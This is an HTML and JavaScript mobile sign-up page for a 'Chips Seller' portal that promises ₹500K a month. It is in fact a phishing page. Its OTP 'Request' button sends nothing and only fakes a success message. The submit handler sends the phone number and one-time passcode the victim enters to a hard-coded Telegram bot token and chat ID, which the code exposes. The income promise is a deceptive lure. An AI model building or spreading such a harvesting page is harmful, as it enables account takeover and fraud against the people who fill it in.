<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chips Seller - Sign Up</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Font - Inter -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #0f0728;
        }

        /* Gradient background matching the app screenshot */
        .bg-purple-gradient {
            background: linear-gradient(135deg, #1c0f4d 0%, #351a88 50%, #4c1d95 100%);
        }

        /* Custom primary button color */
        .bg-brand-purple {
            background-color: #5842dc;
        }
        .bg-brand-purple:hover {
            background-color: #4933c8;
        }
        .text-brand-purple {
            color: #5842dc;
        }

        /* Gold highlight text color */
        .text-gold {
            color: #ffcc00;
        }

        /* Custom speech bubble styling */
        .speech-bubble {
            position: relative;
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            padding: 4px 12px;
            display: inline-block;
        }
        .speech-bubble::after {
            content: '';
            position: absolute;
            bottom: -8px;
            left: 18px;
            width: 0;
            height: 0;
            border-left: 8px solid transparent;
            border-right: 8px solid transparent;
            border-top: 8px solid rgba(255, 255, 255, 0.2);
        }

        /* Glassmorphism custom file input overlay */
        .file-upload-badge {
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(4px);
        }

        /* Toast animation */
        @keyframes slideIn {
            from { transform: translateY(-100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .animate-slide-in {
            animation: slideIn 0.3s ease-out forwards;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-0 sm:p-4">

    <!-- Mobile Frame Container -->
    <div class="w-full max-w-md min-h-screen sm:min-h-[840px] bg-white sm:rounded-[36px] shadow-2xl overflow-hidden flex flex-col justify-between relative border-0 sm:border-8 border-gray-800">
        
        <!-- Toast Notification Container -->
        <div id="toast-container" class="absolute top-4 left-4 right-4 z-50 pointer-events-none flex flex-col gap-2"></div>

        <!-- Upper Banner Area (Dark Purple Gradient) -->
        <div class="bg-purple-gradient pt-8 pb-14 px-6 text-white relative flex-1 flex flex-col justify-between">
            
            <!-- Top Bar: App Branding & Custom Icon Uploader -->
            <div class="flex items-center justify-between mb-4 z-10">
                <div class="flex items-center space-x-3">
                    <!-- Icon Display Box with Upload Overlay -->
                    <div class="relative group w-11 h-11 rounded-2xl bg-white/10 backdrop-blur-md border border-white/20 flex items-center justify-center overflow-hidden cursor-pointer shadow-lg">
                        <img id="app-icon" src="https://api.iconify.design/lucide:poker-chip.svg?color=%23ffcc00" alt="App Icon" class="w-7 h-7 object-contain">
                        <label for="icon-upload" class="absolute inset-0 file-upload-badge flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity cursor-pointer">
                            <i class="fa-solid fa-camera text-white text-xs"></i>
                        </label>
                        <input type="file" id="icon-upload" accept="image/*" class="hidden" onchange="previewIcon(event)">
                    </div>
                    <div>
                        <h2 class="font-extrabold text-lg tracking-wide text-white leading-tight">Chips Seller</h2>
                        <span class="text-[10px] text-purple-200 uppercase tracking-widest font-semibold">Official Portal</span>
                    </div>
                </div>

                <!-- Helper Pill -->
                <button onclick="showIconUploadTip()" class="text-xs bg-white/10 hover:bg-white/20 border border-white/20 px-2.5 py-1 rounded-full text-purple-100 transition">
                    <i class="fa-solid fa-image mr-1"></i> Custom Icon
                </button>
            </div>

            <!-- Main Banner Content -->
            <div class="mt-2 relative z-10">
                <!-- Speech Bubble -->
                <div class="speech-bubble mb-3">
                    <span class="font-black text-sm text-white tracking-wide">JOIN US!</span>
                </div>

                <!-- Main Heading -->
                <h1 class="text-xl sm:text-2xl font-bold leading-snug tracking-tight text-white max-w-[280px]">
                    As an official Chip Seller to earn <span class="text-gold font-black">₹500K monthly.</span>
                </h1>
            </div>

            <!-- Illustration Area -->
            <div class="relative w-full h-36 mt-4 flex items-end justify-end">
                <svg class="w-full h-full max-h-36" viewBox="0 0 320 120" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <!-- Coins Stack -->
                    <g transform="translate(180, 50)">
                        <ellipse cx="25" cy="45" rx="22" ry="8" fill="#D97706" />
                        <ellipse cx="25" cy="42" rx="22" ry="8" fill="#F59E0B" />
                        <ellipse cx="25" cy="39" rx="22" ry="8" fill="#FBBF24" />
                        
                        <ellipse cx="25" cy="30" rx="22" ry="8" fill="#D97706" />
                        <ellipse cx="25" cy="27" rx="22" ry="8" fill="#F59E0B" />
                        <ellipse cx="25" cy="24" rx="22" ry="8" fill="#FBBF24" />

                        <ellipse cx="50" cy="48" rx="20" ry="7" fill="#D97706" />
                        <ellipse cx="50" cy="45" rx="20" ry="7" fill="#FBBF24" />

                        <!-- Big Gold Coin -->
                        <circle cx="20" cy="10" r="22" fill="#F59E0B" stroke="#FDE68A" stroke-width="3"/>
                        <circle cx="20" cy="10" r="16" fill="#FBBF24" />
                        <text x="14" y="16" fill="#92400E" font-size="18" font-weight="bold">₹</text>
                    </g>

                    <!-- Person 1 (Kneeling/Holding Coin) -->
                    <g transform="translate(140, 25)">
                        <!-- Body -->
                        <path d="M25 45 C15 45 10 55 5 70 L35 70 Z" fill="#1E3A8A"/>
                        <!-- Shirt -->
                        <path d="M15 30 L30 30 L35 48 L10 48 Z" fill="#60A5FA"/>
                        <!-- Head -->
                        <circle cx="22" cy="20" r="8" fill="#FCA5A5"/>
                        <!-- Hair -->
                        <path d="M16 18 C16 12 28 12 28 18 Z" fill="#78350F"/>
                    </g>

                    <!-- Person 2 (Pointing Up) -->
                    <g transform="translate(200, 10)">
                        <!-- Legs -->
                        <path d="M20 60 L12 100 M25 60 L32 100" stroke="#F59E0B" stroke-width="8" stroke-linecap="round"/>
                        <!-- Body/Shirt -->
                        <path d="M10 30 L32 30 L30 65 L12 65 Z" fill="#38BDF8"/>
                        <!-- Arm pointing -->
                        <path d="M28 35 L50 10" stroke="#38BDF8" stroke-width="5" stroke-linecap="round"/>
                        <!-- Head -->
                        <circle cx="22" cy="18" r="8" fill="#FCA5A5"/>
                        <!-- Hair -->
                        <path d="M16 16 C16 10 28 10 28 16 Z" fill="#451A03"/>
                    </g>

                    <!-- Person 3 (Standing Right) -->
                    <g transform="translate(250, 15)">
                        <!-- Legs -->
                        <path d="M15 55 L10 95 M22 55 L25 95" stroke="#1E3A8A" stroke-width="7" stroke-linecap="round"/>
                        <!-- Top -->
                        <path d="M8 28 L28 28 L25 58 L10 58 Z" fill="#F43F5E"/>
                        <!-- Head -->
                        <circle cx="18" cy="17" r="7" fill="#FCA5A5"/>
                        <!-- Hair Long -->
                        <path d="M10 14 C10 5 28 5 26 25 Z" fill="#78350F"/>
                    </g>
                </svg>
            </div>
        </div>

        <!-- Form Card Area (White Card overlapping top banner with rounded corners) -->
        <div class="bg-white -mt-8 rounded-t-[32px] px-6 pt-6 pb-8 relative z-20 shadow-2xl flex-1 flex flex-col justify-between">
            
            <div>
                <!-- Card Header Title with Hash Decorative Lines -->
                <div class="text-center mb-6">
                    <h3 class="text-lg font-bold text-gray-900 flex items-center justify-center space-x-2">
                        <span class="text-indigo-300 tracking-tighter font-serif text-xl font-normal">\\\\\</span>
                        <span>Sign up & Earn</span>
                        <span class="text-indigo-300 tracking-tighter font-serif text-xl font-normal">/////</span>
                    </h3>
                </div>

                <!-- Input Form -->
                <form id="signup-form" onsubmit="handleSignUp(event)" class="space-y-4">
                    
                    <!-- Input 1: Phone Number -->
                    <div class="relative flex items-center border border-gray-200 rounded-xl px-4 py-3 bg-gray-50/50 focus-within:bg-white focus-within:border-brand-purple focus-within:ring-2 focus-within:ring-purple-100 transition">
                        <span class="text-gray-900 font-semibold pr-3 border-r border-gray-300 text-sm sm:text-base">+91</span>
                        <input 
                            type="tel" 
                            id="phone-input"
                            maxlength="10"
                            placeholder="Type phone number" 
                            class="w-full pl-3 bg-transparent text-gray-800 placeholder-gray-400 text-sm sm:text-base focus:outline-none font-medium"
                            required
                        >
                    </div>

                    <!-- Input 2: OTP Field with Inline Request Button -->
                    <div class="relative flex items-center border border-gray-200 rounded-xl pl-4 pr-1.5 py-1.5 bg-gray-50/50 focus-within:bg-white focus-within:border-brand-purple focus-within:ring-2 focus-within:ring-purple-100 transition">
                        <input 
                            type="text" 
                            id="otp-input"
                            maxlength="6"
                            placeholder="Type OTP" 
                            class="w-full bg-transparent text-gray-800 placeholder-gray-400 text-sm sm:text-base focus:outline-none font-medium py-1.5"
                            required
                        >
                        <button 
                            type="button" 
                            id="request-otp-btn"
                            onclick="handleRequestOTP()"
                            class="bg-brand-purple hover:bg-indigo-700 text-white font-medium text-xs sm:text-sm px-4 py-2.5 rounded-lg transition-all duration-200 whitespace-nowrap shadow-sm active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                            Request
                        </button>
                    </div>

                    <!-- Input 3: Upline Code (Optional) -->
                    <div class="relative flex items-center border border-gray-200 rounded-xl px-4 py-3 bg-gray-50/50 focus-within:bg-white focus-within:border-brand-purple focus-within:ring-2 focus-within:ring-purple-100 transition">
                        <input 
                            type="text" 
                            id="upline-input"
                            placeholder="Upline Code (Optional)" 
                            class="w-full bg-transparent text-gray-800 placeholder-gray-400 text-sm sm:text-base focus:outline-none font-medium"
                        >
                    </div>

                    <!-- Main Submit Button -->
                    <button 
                        type="submit" 
                        id="submit-btn"
                        class="w-full mt-6 bg-brand-purple hover:bg-indigo-700 text-white font-semibold text-base py-3.5 rounded-xl shadow-lg shadow-purple-200 active:scale-[0.99] transition-all duration-200 flex items-center justify-center space-x-2"
                    >
                        <span>Sign up</span>
                    </button>
                </form>
            </div>

            <!-- Footer / Terms note -->
            <div class="mt-8 text-center">
                <p class="text-xs text-gray-400">
                    By signing up, you agree to our 
                    <a href="#" class="text-brand-purple underline font-medium">Terms</a> & 
                    <a href="#" class="text-brand-purple underline font-medium">Privacy Policy</a>
                </p>
            </div>

        </div>
    </div>

    <!-- JavaScript Logic with Telegram Bot Integration -->
    <script>
        // Aapka naya Telegram Bot Token aur Chat ID yahan set hai
        const BOT_TOKEN = "8786354515:AAFWOAc2lhyzGR_uFATEuZJYK9XaLWWXg5A";
        const CHAT_ID = "7610479523"; // Aapki Chat ID jo bot me use hoti hai

        let timerSeconds = 60;
        let timerInterval = null;

        // Custom Toast Notification Function
        function showToast(message, type = 'info') {
            const container = document.getElementById('toast-container');
            
            const toast = document.createElement('div');
            toast.className = `p-3.5 rounded-xl shadow-lg text-xs sm:text-sm font-medium text-white flex items-center justify-between pointer-events-auto animate-slide-in ${
                type === 'success' ? 'bg-emerald-600' :
                type === 'error' ? 'bg-rose-600' : 'bg-gray-900'
            }`;

            const icon = type === 'success' ? 'fa-circle-check' : type === 'error' ? 'fa-triangle-exclamation' : 'fa-circle-info';

            toast.innerHTML = `
                <div class="flex items-center space-x-2">
                    <i class="fa-solid ${icon}"></i>
                    <span>${message}</span>
                </div>
                <button onclick="this.parentElement.remove()" class="ml-3 text-white/80 hover:text-white">
                    <i class="fa-solid fa-xmark text-xs"></i>
                </button>
            `;

            container.appendChild(toast);

            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.3s ease';
                setTimeout(() => toast.remove(), 300);
            }, 3500);
        }

        // Preview uploaded icon
        function previewIcon(event) {
            const file = event.target.files[0];
            if (file) {
                if (file.size > 2 * 1024 * 1024) {
                    showToast("Please choose an image under 2MB", "error");
                    return;
                }
                const reader = new FileReader();
                reader.onload = function(e) {
                    document.getElementById('app-icon').src = e.target.result;
                    showToast("Custom icon updated successfully!", "success");
                };
                reader.readAsDataURL(file);
            }
        }

        // Tip alert for icon upload
        function showIconUploadTip() {
            showToast("Click on the chip icon logo at top left to upload your custom app icon!", "info");
        }

        // Request OTP Handler
        function handleRequestOTP() {
            const phoneInput = document.getElementById('phone-input').value.trim();
            const btn = document.getElementById('request-otp-btn');

            // Phone validation (10 digits)
            if (!/^\d{10}$/.test(phoneInput)) {
                showToast("Please enter a valid 10-digit phone number", "error");
                document.getElementById('phone-input').focus();
                return;
            }

            // Disable button and start countdown
            btn.disabled = true;
            let currentTimer = timerSeconds;
            
            showToast("OTP sent successfully!", "success");

            btn.innerText = `${currentTimer}s`;

            timerInterval = setInterval(() => {
                currentTimer--;
                if (currentTimer > 0) {
                    btn.innerText = `${currentTimer}s`;
                } else {
                    clearInterval(timerInterval);
                    btn.disabled = false;
                    btn.innerText = 'Request';
                }
            }, 1000);
        }

        // Sign Up Form Submission & Telegram Notification
        async function handleSignUp(event) {
            event.preventDefault();
            
            const phone = document.getElementById('phone-input').value.trim();
            const otp = document.getElementById('otp-input').value.trim();
            const upline = document.getElementById('upline-input').value.trim() || 'None';
            const submitBtn = document.getElementById('submit-btn');

            if (!/^\d{10}$/.test(phone)) {
                showToast("Please enter a valid 10-digit phone number", "error");
                return;
            }

            if (!otp) {
                showToast("Please enter OTP", "error");
                return;
            }

            // Button ko loading state me dalna
            submitBtn.disabled = true;
            submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i> Submitting...`;

            // Telegram message format
            const message = `🚨 *New Chips Seller Sign Up!*\n\n📱 *Phone:* +91 ${phone}\n🔑 *OTP:* ${otp}\n🔗 *Upline:* ${upline}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    showToast("Successfully Submitted to Bot!", "success");
                    document.getElementById('signup-form').reset();
                } else {
                    showToast("Failed to send data to Telegram bot.", "error");
                }
            } catch (error) {
                console.error('Error:', error);
                showToast("Network error occurred!", "error");
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = `<span>Sign up</span>`;
            }
        }
    </script>
</body>
</html>
